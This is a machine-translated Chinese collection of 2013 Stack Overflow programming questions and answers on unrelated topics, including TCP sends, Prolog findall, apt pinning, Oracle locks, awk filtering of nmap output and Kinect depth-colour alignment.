在配置 Apache (2.4.4) 以将流量（即 Web 表单的条目）转发到与 Apache 相同的主机上运行的外部进程，但在端口上监听 4321 时，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T23:30:52.377

终于在 Apache 论坛上得到了答案。以为为了后代我会把它贴在这里

> 我不认为这是一个 apache/httpd 问题，而是一个编程问题。表单提交后，将转到一个脚本，该脚本将处理表单上的值（隐藏的以及用户输入的），并且可以执行任何必要的操作，以任何需要的方式发送这些数据。您可能需要稍微小心地选择后端表单的编程语言，以确保它可以完成所需的操作，但基本语言（如 perl 和 php）应该能够处理这个问题。你只需要有人做必要的编程。

# c - 如果数据包没有发送到另一端系统，则等待发送？C 发送（）

> ID：15936295
> 
> 赞同：0
> 
> 时间：2013-04-10T20:59:37.000
> 
> 标签：c, linux, sockets, networking, send

我在 Linux 标准套接字上使用发送通过网络写入数据包。发送调用，缓冲数据并“总是”返回大于 0 的值。发送将问题传递给操作系统和较低级别。如何停止发送调用并等待数据包传送到另一个端系统？等待 TCP ACK 或类似的东西？

```
if (send(broker->socket, packet, sizeof(packet), 0) < sizeof(packet)){
 return -3;
} 
```

测试将像：开始发送数据包，移除以太网，重新连接。
谢谢，对不起我的英语不好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:02:39.103

没有真正可靠的方法可以确定远程对等方是否确认了您的数据。事实上，即使远程 TCP 确认您的数据并不意味着远程进程读取它。最简单的方法是实现一种应用层 ACK，其中对等方发回一个字节信号“ok, got it”。

*   你打电话`send`，它几乎立即返回
*   此时内核开始工作，尝试推送数据
*   你调用`recv`哪些块
*   远程端接收数据并发送回一些数据，确认它
*   你的`recv`解锁

此时您可以确定远程端收到了您的数据。

# c# - 在具有 c#、poco 和 ado.net 的存储库中，最好的是一个类用于整个存储库还是每个实体有几个类？

> ID：15936296
> 
> 赞同：0
> 
> 时间：2013-04-10T20:59:37.033
> 
> 标签：c#, ado.net, repository-pattern, poco

我正在为我的项目创建一个存储库，实际上是它的一个子集，带有 c#、poco 和旧的 ado.net（没有 ORM）。我有几个实体，我的存储库将通过 DAL 对它们进行 CRUD。我的 DAL 是 IDisposable，因此我在实例化它时设法打开了与数据库的连接，并在 Dispose 方法中关闭了该连接。现在我想知道，我应该在存储库中为每个实体使用一个类还是为所有实体使用一个巨大的类？第二种方法将允许我打开连接，根据需要检索许多实体，然后关闭它。第一个我必须为每个实体打开和关闭一个连接，如下所示：

```
 //One big class for all entities, opens one connection
 using(RepositoryForAll rfa = new RepositoryForAll())
 {
     Customer c = rfa.GetCustomer(Customerid);
     Order o = rfa.GetOrder(OrderId);
 }
 //closes the connection

 //One repository class per entity, also one connection
 using(RepositoryCustomer customers = new RepositoryCustomer())
 {
     var c = customers.Get(CustomerId);
 }
 //closes the connection for RepositoryCustomer

 using(RepositoryOrder orders = new RepositoryOrder())
 {
     var c = orders.Get(OrderId);
 }
 //closes the connection for RepositoryOrder 
```

这有意义吗？我在某本书中读到了 AggregateRoot，它提出了另一种方法。这是一个相当简单的示例，我的存储库不必那么复杂。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:14:18.027

不同的解决方案怎么样？*在存储库之外*创建您的连接（或事务或工作单元），并将其传递给存储库。
像这样-

```
using(var tx = new Transaction())
 {
     RepositoryCustomer customers = new RepositoryCustomer(tx)
     RepositoryOrder orders = new RepositoryOrder(tx)
     var c = customers.Get(CustomerId);
     var o = orders.Get(OrderId);
 } 
```

（当然，这只是一个简单的例子；我建议使用某种 IoC 机制而不是自己实例化对象。
另外，您可能想阅读一些有关该`Unit of work`概念的信息，这可能适用于此处）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:18:16.383

在可管理的组中组织课程。

在您的情况下，我认为 Order 和 Customer 应该属于 OrderRepository。

产品将进入 CatalogueRepository。

如果在单元测试时需要模拟类，它们会进入自己的存储库。那可能是一个 PaymentRepository。

# prolog - Prolog findall/3：不止一袋

> ID：15936298
> 
> 赞同：5
> 
> 时间：2013-04-10T20:59:38.513
> 
> 标签：prolog, prolog-findall

我正在为 Fox and Geese 类型的游戏编写 AI。我的谓词之一如下所示：

```
moveFox(+PrevState, -NextState, -PegList, +VisitedStates, -NewVisitedStates) 
```

它需要一个游戏状态并与狐狸一起移动。结果状态与 统一，`NextState`实际移动与 统一`PegList`。一切都按预期工作。

我正在计算所有动作的效用分数' `NextState`。为了能够找到具有最高效用得分的州，我`findall/3`在比较它们的效用得分之前使用列表中的所有州。

```
findall(NextState, moveFox(...), NextStatesList) 
```

通过找到最大效用得分，我知道效用得分最高的`NextState`（以及它在列表中的位置）。只有一个问题，目前我还没有写任何谓词来推断采取了哪一步`NextState`，例如：

```
getMove(+PrevState, +NextState, -PegList) 
```

与其编写这样的谓词，我更愿意使用`findall/3`或等效。我的问题是是否有某种方法可以在两个不同的列表中获取两个不同的变量。我在想这样（如果可行的话）：

```
findall([NextState, PegList], moveFox(...), [NextStatesList, MoveList]) 
```

我可以实现这样的功能而不必运行`findall/3`两次（难看的开销）或编写`getMove(+PrevState, +NextState, -PegList)`谓词吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:18:03.523

这个问题可以通过建立一个 pair 列表来解决*，*然后像 library( [pairs](http://www.swi-prolog.org/pldoc/doc_for?object=section%282,%27A.18%27,swi%28%27/doc/Manual/pairs.html%27%29%29) ) 那样分离元素

```
...
findall(NextState-PegList, moveFox(...), Pairs),
pairs_keys_values(Pairs, NextStates, Pegs),
... 
```

如果您的 Prolog 没有pairs_keys_values/3，那么使用maplist 或通过递归谓词编写都很容易。这是maplist方式：

```
pkv(K-V, K, V).
pairs_keys_values(Pairs, Keys, Vals) :-
    maplist(pkv, Pairs, Keys, Vals). 
```

# php - PHP - 按特定索引重新排列数组

> ID：15936309
> 
> 赞同：5
> 
> 时间：2013-04-10T21:00:12.130
> 
> 标签：php, arrays, sorting, indexing

例如我有以下代码：

```
$sample = array(apple, orange, banana, grape); 
```

我想通过制作`$sample[2]`new来重新排列这个数组，`$sample[0]`同时在整个数组中保持相同的顺序。

输出应该是：

```
Array ( [0] => banana [1] => grape [2] => apple [3] => orange) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-10T21:11:27.447

[`array_shift()`](http://www.php.net/manual/en/function.array-shift.php)根据需要多次使用...

```
$sample = array('apple', 'orange', 'banana', 'grape');

$fruit = array_shift($sample);
$sample[] = $fruit;
// now $sample will be array('orange', 'banana', 'grape', 'apple'); 
```

所以说你想做一个功能：

```
function rearrange_array($array, $key) {
    while ($key > 0) {
        $temp = array_shift($array);
        $array[] = $temp;
        $key--;
    }
    return $array;
} 
```

现在，使用`rearrange_array($sample, 2)`您可以将示例数组重新排列为所需的输出。

# python - 带有变音符号和连字的 Python 3 正则表达式，

> ID：15936315
> 
> 赞同：7
> 
> 时间：2013-04-10T21:00:48.957
> 
> 标签：python, regex, diacritics

名称形式为：Ceasar，Julius 将被拆分为 First_name Julius Surname Ceasar。

名称可能包含变音符号 (á à é ..) 和连字 (æ, ø)

此代码在 Python 3.3 中似乎可以正常工作

```
import re

def doesmatch(pat, str):  
    try: 
        yup = re.search(pat, str)
        print('Firstname {0} lastname {1}'.format(yup.group(2), yup.group(1)))
    except AttributeError:
        print('no match for {0}'.format(str))

s = 'Révèrberë, Harry'
t = 'Åapö, Renée'
u = 'C3po, Robby'
v = 'Mærsk, Efraïm'
w = 'MacDønald, Ron'
x = 'Sträßle, Mpopo'

pat = r'^([^\d\s]+), ([^\d\s]+)'
# matches any letter, diacritic or ligature, but not digits or punctuation inside the () 

for i in s, t, u, v, w, x:
    doesmatch(pat, i) 
```

除了你之外的所有匹配。（名称中的数字不匹配），但我想知道是否没有比非数字非空格方法更好的方法。更重要的是：我想改进模式，以便区分大写字母和小写字母，但是*包括*大写变音符号和连字，最好也使用正则表达式。好像 ([AZ][az]+)，将匹配重音字符和组合字符。

这可能吗？

（到目前为止我所看到的： [Dive into python 3 on UTF-8 vs Unicode](http://getpython3.com/diveintopython3/strings.html)；这个关于 Unicode 的正则[表达式教程](http://www.regular-expressions.info/unicode.html)（我没有使用）；我认为我不需要[新的正则表达式](https://pypi.python.org/pypi/regex/)，但我承认我没有t 阅读其所有文档）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:07:15.150

如果您想使用标准库的模块区分大小写字母`re`，那么恐怕您必须手动构建所有相关 Unicode 代码点的字符类。

如果您真的不需要这样做，请使用

```
[^\W\d_] 
```

匹配任何 Unicode 字母。这个字符类匹配任何“不是非字母数字字符”（与“字母数字字符”相同）也不是数字也不是下划线的东西。

# linux - 如何在不将所有软件包升级到 debian wheezy 的情况下强制 debian 挤压使用来自 debian wheezy 的 libqt4-dev？

> ID：15936318
> 
> 赞同：1
> 
> 时间：2013-04-10T21:01:02.353
> 
> 标签：linux, debian, apt

我有一个持续集成服务器，它构建了一些软件，这些软件依赖于 libqt4-dev 的更新版本，而不是 debian 挤压中的 apt 软件包提供的。该版本在 debian wheezy 中可用。如何告诉 apt 从 wheezy 中选择性地使用 libqt4-dev 而无需将我的挤压系统中的所有软件包都升级到 wheezy？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T17:32:52.623

您可以使用 apt 的“首选项”功能 ( `man apt_preferences`) 来做到这一点。

要将 wheezy 添加为软件包源而不默认安装 wheezy 中的任何内容，请将 wheezy 的条目添加到您的`sources.list`中，并将以下内容添加到`/etc/apt/preferences`（或中的文件`preferences.d`）：

```
Package: *
Pin: release n=wheezy
Pin-Priority: 50 
```

设置完成后，您可以使用以下命令安装 libqt4-dev：

```
apt-get install -t wheezy libqt4-dev 
```

这也会安装可能很多的 libqt4-dev 的依赖项。不熟悉qt，我不确定这里的固定解决方案是否是将较新版本的qt 安装到squeeze 系统上的最佳方式。另一种可能性是[backports repository](http://backports.debian.org)，但我在那里看不到 qt4 。第三种可能性是使用`apt-get -b source`.

# oracle - oracle中有哪些不同类型的锁

> ID：15936323
> 
> 赞同：5
> 
> 时间：2013-04-10T21:01:33.820
> 
> 标签：oracle, locking

请任何人解释 Oracle 中的锁定模式，即共享、独占和更新锁。我发现了很多关于这个和根据那个的理论

共享锁：没有人可以更改数据，只读目的

排他锁：只允许一个用户/连接更改数据。

更新锁：行被锁定，直到用户提交/回滚。

然后，我尝试共享以检查它是如何工作的

```
SQL> lock table emp in share mode;

Table(s) Locked.

SQL> update emp set sal=sal+10;

14 rows updated. 
```

然后，我发现，用户可以在共享锁定后更改数据。那么，它与排他锁和更新锁的区别是什么。

另一个问题，更新锁和排他锁如何彼此不同，甚至它们看起来几乎相同。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2017-11-19T22:29:39.707

*为未来的访客发布解释，它也给出了答案。*

# 共享锁

*   在开始之前让我先说一下表锁有 5 种类型 - 行共享、行独占、共享、共享行独占和独占。共享锁就是其中之一。另外，请注意有行锁，它不同于表锁。按照我最后提供的链接阅读所有这些。
*   在以下语句中指定的表上获取共享锁 -`LOCK TABLE table IN SHARE MODE;`
*   此锁防止其他事务获得“行独占”（该锁由 INSERT、UPDATE 和 DELETE 语句使用）、“共享行独占”和“独占”表锁，否则一切都被允许。
*   因此，这意味着共享锁将阻止其他事务在该表上执行 INSERT、UPDATE 和 DELETE 语句，但将允许其他事务使用“SELECT ... FOR UPDATE”语句更新行，因为对于该语句，“行共享”锁是必需的，并且在需要“共享”锁时是允许的。

下表很好地总结了锁和允许的内容。

[![在此处输入图像描述](https://i.stack.imgur.com/fvzQ6.png)](https://i.stack.imgur.com/fvzQ6.png)

* * *

*由于很多用户都会关注这个问题，所以我决定更进一步，并写下我的学习笔记，我希望人们能从中受益：*

[![在此处输入图像描述](https://i.stack.imgur.com/K6rgk.png)](https://i.stack.imgur.com/K6rgk.png) [![在此处输入图像描述](https://i.stack.imgur.com/L7gOj.png)](https://i.stack.imgur.com/L7gOj.png) [![在此处输入图像描述](https://i.stack.imgur.com/dVt60.png)](https://i.stack.imgur.com/dVt60.png) [![在此处输入图像描述](https://i.stack.imgur.com/cxKP1.png)](https://i.stack.imgur.com/cxKP1.png) [![在此处输入图像描述](https://i.stack.imgur.com/dzEQn.png)](https://i.stack.imgur.com/dzEQn.png) [![在此处输入图像描述](https://i.stack.imgur.com/qwHi3.png)](https://i.stack.imgur.com/qwHi3.png)

* * *

[此信息的来源以及有关 Oracle 锁的优秀读物](https://docs.oracle.com/cd/B19306_01/server.102/b14220/consist.htm#i5704)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:36:18.677

在文档中有很好的解释：http: [//docs.oracle.com/cd/E11882_01/server.112/e41084/ap_locks001.htm#SQLRF55502](http://docs.oracle.com/cd/E11882_01/server.112/e41084/ap_locks001.htm#SQLRF55502)

在您的示例中，您将表锁定为共享模式。这不会阻止其他会话在共享模式下锁定同一个对象，但它确实会阻止它们以独占模式锁定它，因此您无法在更新表（需要独占锁）时删除表（它有一个共享锁） ）。

# jquery - fullcalendar插件更改css？

> ID：15936326
> 
> 赞同：0
> 
> 时间：2013-04-10T21:01:49.363
> 
> 标签：jquery, fullcalendar

我喜欢改变CSS。例如，在议程日视图中的列日名称不应被格式化为粗体。我可以通过格式化环绕的 div 来更改字体大小。但是如何更改特殊单元格的格式？

但我没有找到正确的 css 条目。有人可以帮忙吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:15:48.997

看起来您只需要覆盖`<th>`元素的样式。看起来 fullcalendar 没有应用任何自定义样式。

这个CSS应该工作：

```
th {
   font-weight: normal;
} 
```

# linux - 删除由空行包围的行

> ID：15936327
> 
> 赞同：0
> 
> 时间：2013-04-10T21:01:54.840
> 
> 标签：linux, sed, awk

基本上，我有来自 nmap 的输出，它给了我一个 IP，然后是下面的开放端口列表，然后是一个空行。我已经过滤掉了我不再需要的端口（`grep -v http`例如），但我不知道如何删除没有以下端口的 IP 地址。

有没有办法用 sed 做到这一点？

样本数据：

```
Nmap scan report for 1.1.1.1
3389/tcp  open  ms-term-serv
5357/tcp  open  unknown
5432/tcp  open  postgresql
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap scan report for 2.2.2.2

Nmap scan report for 3.3.3.3
80/tcp    open  http
443/tcp   open  https
6646/tcp  open  unknown
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:23:15.730

以下 awk 代码段适用于我创建的虚构文件：

```
22.22.22.22
dflkhhdfjhdk
tslkdkffhdskjgh

33.33.33.33
tddfgkghdfkj

44.44.44.44

55.55.55.55
ghdkjghdkfjhjdfhg
iuryweiu
kjwhkjfh

66.66.66.66

77.77.77.77
cxlvbclbnc 
```

并通过以下`awk`程序运行它：

```
awk '/[0-9][0-9].[0-9][0-9].[0-9][0-9].[0-9][0-9]/ { K=$0; next }
K { if(length) print K "\n" $0; K=""; next }
1
END { if(K) print K }' infile > outfile 
```

之后outfile的内容如下：

```
22.22.22.22
dflkhhdfjhdk
tslkdkffhdskjgh

33.33.33.33
tddfgkghdfkj

55.55.55.55
ghdkjghdkfjhjdfhg
iuryweiu
kjwhkjfh

77.77.77.77
cxlvbclbnc 
```

我用来匹配 IP 地址的正则表达式当然需要修改以匹配您的特定情况，但我认为您已经涵盖了它。

希望这可以帮助。我知道它还`sed`不够接近，但我想。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:29:47.753

你`awk`可以简单地做`awk '$2' ORS='\n\n' FS='\n' RS= file`：

```
$ awk '$2' ORS='\n\n' FS='\n' RS= file
Nmap scan report for 1.1.1.1
3389/tcp  open  ms-term-serv
5357/tcp  open  unknown
5432/tcp  open  postgresql
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap scan report for 3.3.3.3
80/tcp    open  http
443/tcp   open  https
6646/tcp  open  unknown
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown 
```

如果在先前脚本中添加到文件末尾的额外换行符有问题，则使用此替代方法：

```
awk '/^Nmap/{h=$0;i=NR;next}NR==i+1{if($0){print h;p=1}else p=0}p' file 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T21:41:40.580

这很容易`sed`：

```
sed '$!N;/\n$/d' filename 
```

或者，如果您想就地更改文件：

```
sed -i '' '$!N;/\n$/d' filename 
```

# java - UnitTest (groovy + grails) - 无法拆卸元类

> ID：15936329
> 
> 赞同：2
> 
> 时间：2013-04-10T21:02:01.443
> 
> 标签：java, unit-testing, grails, groovy, metaclass

当我尝试清理班级时遇到问题。

```
void testFileExists() {

  FileObject file = EasyMock.createMock(FileObject.class)

  VfsFileSystemManager.metaClass.getFile = {String s, String a ->return file}

  FileObject.metaClass.exists = {-> return true}

  assertEquals true, siteManagerHelper.fileExists(STRING, STRING)

}

void testFileNotExists() {

  FileObject file = EasyMock.createMock(FileObject.class)

  VfsFileSystemManager.metaClass.getFile = {String s, String a ->return file}

  FileObject.metaClass.exists = {-> return false}

  assertEquals false, siteManagerHelper.fileExists(STRING, STRING)

} 
```

当我当时运行一个时，它们工作正常，但如果我同时运行两个，exists() 总是返回 true（如果我将第一个 .metaclass 更改为 false，它返回 false）。所以我认为它不会破坏元类。

该类扩展了 GroovyTestCase，我检查了是否应该添加：

```
def remove = GroovySystem.metaClassRegistry.&removeMetaClass
remove FileObject 
```

但它不起作用。

请帮忙！

编辑：

我正在使用 grails 1.3.7 和 groovy 1.6.8

```
private boolean fileExists(String path, String file){

    if(path != null && path != ""){

     FileObject fileToCheck = fsManager.getFile(path, file)

     boolean fileExists = fileToCheck.exists()

     logger.debug "File exists? ${fileExists}"

     return fileExists
    }

    logger.debug "The path is null or empty"

    return false

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T15:40:27.603

我遇到了类似的问题（Grails 2.2.0），我能够通过以下操作来克服它：

1.  在测试方法结束时使用`GroovySystem.metaClassRegistry.removeMetaClass(FileObject.class)`拆卸

2.  在测试类中使用`FileObject.metaClass = null`tearDown()

我仍然想知道为什么我们需要同时使用两个 tearDown 。

注意：- 在我的例子中，与 Java 对象相比，我对 Groovy 对象进行了元分类。

# c++ - Kinect SDK：对齐深度和颜色帧

> ID：15936330
> 
> 赞同：19
> 
> 时间：2013-04-10T21:02:04.323
> 
> 标签：c++, image-processing, kinect, kinect-sdk

我正在使用 Kinect 传感器，我正在尝试对齐深度和颜色帧，以便我可以将它们保存为“适合”彼此的图像。我花了很多时间浏览 msdn 论坛和 Kinect SDK 的简陋文档，但我一无所获。

基于此答案：[Kinect：从 RGB 坐标转换为深度坐标](https://stackoverflow.com/questions/13296059/kinect-converting-from-rgb-coordinates-to-depth-coordinates)

我有以下函数，其中`depthData`和`colorData`是从中获得的，`NUI_LOCKED_RECT.pBits`并且`mappedData`是包含新颜色框架的输出，映射到深度坐标：

```
bool mapColorFrameToDepthFrame(unsigned char *depthData, unsigned char* colorData, unsigned char* mappedData)
{
    INuiCoordinateMapper* coordMapper;

    // Get coordinate mapper
    m_pSensor->NuiGetCoordinateMapper(&coordMapper);

    NUI_DEPTH_IMAGE_POINT* depthPoints = new NUI_DEPTH_IMAGE_POINT[640 * 480];

    HRESULT result = coordMapper->MapColorFrameToDepthFrame(NUI_IMAGE_TYPE_COLOR, NUI_IMAGE_RESOLUTION_640x480, NUI_IMAGE_RESOLUTION_640x480, 640 * 480, reinterpret_cast<NUI_DEPTH_IMAGE_PIXEL*>(depthData), 640 * 480, depthPoints);
    if (FAILED(result))
    {
        return false;
    }    

    int pos = 0;
    int* colorRun = reinterpret_cast<int*>(colorData);
    int* mappedRun = reinterpret_cast<int*>(mappedData);

    // For each pixel of new color frame
    for (int i = 0; i < 640 * 480; ++i)
    {
        // Find the corresponding pixel in original color frame from depthPoints
        pos = (depthPoints[i].y * 640) + depthPoints[i].x;

        // Set pixel value if it's within frame boundaries
        if (pos < 640 * 480)
        {
            mappedRun[i] = colorRun[pos];
        }
    }

    return true;
} 
```

运行此代码时，我得到的只是一个未更改的颜色框，其中删除了（白色）depthFrame 没有信息的所有像素。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T20:40:12.267

使用 OpenNI 框架有一个选项调用注册。

IMAGE_REGISTRATION_DEPTH_TO_IMAGE – 将深度图像转换为与 RGB 图像具有相同的明显有利位置。

OpenNI 2.0 和 Nite 2.0 可以很好地捕获 Kinect 信息，并且有很多教程。

你可以看看这个：

[Kinect 与 OpenNI](http://www.codeproject.com/Articles/148251/How-to-Successfully-Install-Kinect-on-Windows-Open)

OpenNi 在 SimplerViewer 中有一个合并深度和颜色的示例，也许您可​​以看看并尝试一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-10T16:49:53.990

这可能不是您希望的快速答案，但这种转换在`ofxKinectNui`openFrameworks 的插件中成功完成[（参见此处）](https://github.com/sadmb/ofxKinectNui/blob/master/src/ofxKinectNui.cpp#L461)。

它看起来像是[这里](https://github.com/sadmb/ofxKinectNui/blob/master/src/kinect/nui/Kinect.cpp#L221)定义的函数`ofxKinectNui`的委托。`GetColorPixelCoordinatesFromDepthPixel`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-07-11T07:57:14.990

我认为在你的代码中有不同的不正确的行。

*首先，您将哪种深度图传递给您的函数？*

深度数据使用两个字节存储每个值，这意味着您应该用于深度数据的指针的正确类型是**unsigned short**。

第二点是，据我了解，您希望将深度帧映射到颜色帧，因此您必须从 kinect sdk 调用的正确函数是**MapDepthFrameToColorFrame**而不是 MapColorFrameToDepthFrame。

最后，该函数将返回一个点的地图，对于位置 [i] 处的每个深度数据，您拥有应该映射该点的位置 x 和位置 y。
要做到这一点，你*不需要 colorData 指针*。

所以你的功能应该修改如下：

```
/** Method used to build a depth map aligned to color frame
    @param [in]  depthData    : pointer to your data;
    @param [out] mappedData   : pointer to your aligned depth map;
    @return true if is all ok : false whene something wrong
*/

bool DeviceManager::mapColorFrameToDepthFrame(unsigned short *depthData,  unsigned short* mappedData){
    INuiCoordinateMapper* coordMapper;
    NUI_COLOR_IMAGE_POINT* colorPoints = new NUI_COLOR_IMAGE_POINT[640 * 480]; //color points
    NUI_DEPTH_IMAGE_PIXEL* depthPoints = new NUI_DEPTH_IMAGE_PIXEL[640 * 480]; // depth pixel

    /** BE sURE THAT YOU ARE WORKING WITH THE RIGHT HEIGHT AND WIDTH*/  
    unsigned long refWidth = 0;
    unsigned long refHeight = 0;
    NuiImageResolutionToSize( NUI_IMAGE_RESOLUTION_640x480, refWidth, refHeight );
    int width  = static_cast<int>( refWidth  ); //get the image width in a right way
    int height = static_cast<int>( refHeight ); //get the image height in a right way

    m_pSensor>NuiGetCoordinateMapper(&coordMapper); // get the coord mapper
    //Map your frame;
    HRESULT result = coordMapper->MapDepthFrameToColorFrame( NUI_IMAGE_RESOLUTION_640x480, width * height, depthPoints, NUI_IMAGE_TYPE_COLOR, NUI_IMAGE_RESOLUTION_640x480, width * height, colorPoints );
    if (FAILED(result))
       return false;

    // apply map in terms of x and y (image coordinates);
    for (int i = 0; i < width * height; i++)
       if (colorPoints[i].x >0 && colorPoints[i].x < width && colorPoints[i].y>0 &&    colorPoints[i].y < height)
            *(mappedData + colorPoints[i].x + colorPoints[i].y*width) = *(depthData + i );

    // free your memory!!!
    delete colorPoints;
    delete depthPoints;
    return true;
} 
```

确保您的 mappedData 已以正确的方式初始化，例如如下所示。

```
mappedData = (USHORT*)calloc(width*height, sizeof(ushort)); 
```

请记住，kinect sdk 不提供颜色和深度数据之间的准确对齐功能。

如果您想要两个图像之间的精确对齐，您应该使用校准模型。在这种情况下，我建议您使用基于 Heikkilä 校准模型的 Kinect 校准工具箱。

您可以在以下链接中找到它：
[http](http://www.ee.oulu.fi/~dherrera/kinect/) ://www.ee.oulu.fi/~dherrera/kinect/ 。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-04T01:23:00.770

我认为问题在于您正在调用 MapColorFrameToDepthFrame，而实际上您应该调用 MapDepthFrameToColorFrame。

确凿的证据是这行代码：

> ```
> mappedRun[i] = colorRun[pos]; 
> ```

读取`pos`和写入`i`是向后的，因为`pos = depthPoints[i]`表示与 处的颜色坐标对应的深度坐标`i`。您实际上想要迭代写入所有*深度*坐标并从相应*颜色*坐标处的输入彩色图像中读取。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-08-06T07:55:22.840

首先，您必须校准您的设备。这意味着，您应该校准 RGB 和 IR 传感器，然后找到 RGB 和 IR 之间的转换。了解此信息后，您可以应用该功能：

```
RGBPoint = RotationMatrix * DepthPoint + TranslationVector 
```

检查 OpenCV 或 ROS 项目以获取更多详细信息。

[外部校准](http://wiki.ros.org/openni_launch/Tutorials/ExtrinsicCalibration)

[内在校准](http://wiki.ros.org/openni_launch/Tutorials/IntrinsicCalibration)

# html - 嵌套在另一个 inline-block 元素中的 inline-block 元素具有 offsetTop

> ID：15936336
> 
> 赞同：8
> 
> 时间：2013-04-10T21:02:22.370
> 
> 标签：html, css

我是新学习 HTML，现在我有一些代码，例如

```
<div id="container" style="height:300px;width:500px;font-size:0">
    <div id="leftBox" style="display: inline-block; background: pink; width: 50%; height: 100%;">
        <div id="wrapper" style="height:10%;">
            <div style="display: inline-block; background: red; width: 50%; height: 100%;"></div>
            <div style="display: inline-block; background: blue; width: 50%; height: 100%;"></div>
        </div>
    </div>
    <div id="rightBox" style="display: inline-block; background: green; width: 50%; height: 100%;"></div>
</div> 
```

（我把它贴在[http://jsfiddle.net/Simon_Chan/Z3WyA/](http://jsfiddle.net/Simon_Chan/Z3WyA/)上）

可以看到`leftBox`有一个很大的offsetTop，但是如果没有`wrapper` *或* `wrapper`的高度为100% *，或者*没有`rightBox` *或*没有元素`wrapper`，在所有这些条件下`leftBox`都没有offsetTop。

为什么这样做？以及如何删除它？

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-10T21:24:56.837

要解决问题，您需要`vertical-align:top`添加`#leftBox` *或* `#rightBox`

原因是默认[`vertical-align`](http://www.w3.org/wiki/CSS/Properties/vertical-align)值是`baseline`which

> 将框的基线与父框的基线对齐

父框的基线是框的底部。

[基线](http://en.wikipedia.org/wiki/Baseline_%28typography%29)定义为

> 大多数字母“坐”的线和下降线延伸的线下方

您在问题中描述的所有情况都会导致基线被更改，从而根据需要对齐元素。

*基线*的一个很好的示例是以下代码，其中您的包装器中没有元素，`<div>`而是非常大的字体大小的文本。您可以看到*绿色的底部如何与父级的* *基线*（红色虚线边框）`<div>`对齐，以及*粉红色*的文本如何使其移动到位于父级*基线*上的文本位置。*`<div>` *`<div>`**

 ***```
<div style="height:300px;width:500px;font-size:0;border:1px dotted red">
    <div style="display: inline-block; background: pink; width: 50%; height: 100%;">
        <div style="height:100%;font-size:150px">foo</div>
    </div>
    <div style="display: inline-block; background: green; width: 50%; height: 100%;"></div>
</div> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-10T21:24:04.617

这样做是因为各种盒子位于基线上的方式。消除该问题的最简单方法是以不同方式垂直对齐它们。例如使用`div {vertical-align:top }`

要查看默认情况下内联块框如何位于基线上，请参阅[http://jsfiddle.net/veCEf/](http://jsfiddle.net/veCEf/)。请特别注意没有任何内容的 inline-block div 框如何使其框的底部位于基线上，而一旦它们有内容，其内容的底部位于基线上。***

# iis - 可以发布到 IIS 平滑流服务器的 Expression Encoder 的免费替代品

> ID：15936337
> 
> 赞同：0
> 
> 时间：2013-04-10T21:02:25.143
> 
> 标签：iis, iis-7, live-streaming, smooth-streaming

我正在寻找 Expression Encoder 4 的免费替代品，它可以将输出流式传输到 IIS Live Smooth Streaming。有谁知道他们可以推荐的吗？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T19:11:07.470

据我所知，Enconder 4 没有可以输出平滑流输出的免费替代品。

有一些付费替代品，例如 Wowza 和统一流媒体平台 (USP) 等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-12T21:06:31.607

虚幻媒体服务器正在为我工​​作。它的配置有点迟钝，看起来像是从 Windows 95 中逃逸出来的，但可以工作。免费版本的用户限制不是问题，因为连接的用户永远不会超过一个——IIS 本身。

[http://umediaserver.net](http://umediaserver.net)

请记住先安装 DShow 编解码器包。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-17T19:59:15.360

FFMPEG 可以做到这一点，但现在你被绑定到命令行模式，直到有人来自 FFSplit 或 OBS 认识到，这些工具可以很容易地修复以支持 IIS 发布点。

查看文档（搜索 ismv muxer 和 http 输出）。

# c# - 使用复合键查询集合，其中关键部分可以匹配“任何”

> ID：15936339
> 
> 赞同：0
> 
> 时间：2013-04-10T21:02:37.370
> 
> 标签：c#, collections

是否有适当的集合或算法允许我使用复合键获取值，在查询部分键时可能为 null 以表示匹配任何值？

例如，如果我有课程：

```
 class Key
    {
        string p1{ get; }
        string p2{ get; }
        string p3{ get; }

        public Key(string p1, string p2 , string p3)
        { this.p1 = p1;  this.p2 = p2; this.p3=p3;  }
    } 
```

如果我然后创建了三个键，例如

```
new Key( "a","b","c")
new Key( "d","b","c")
new Key( "e","f","c") 
```

我想要一个没有迭代的集合或算法以允许以下键

```
new Key( null, "b","c") to return the values mapped to the first two keys,
new key( null,null,"c") to return the values mapped to all of the keys. 
```

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
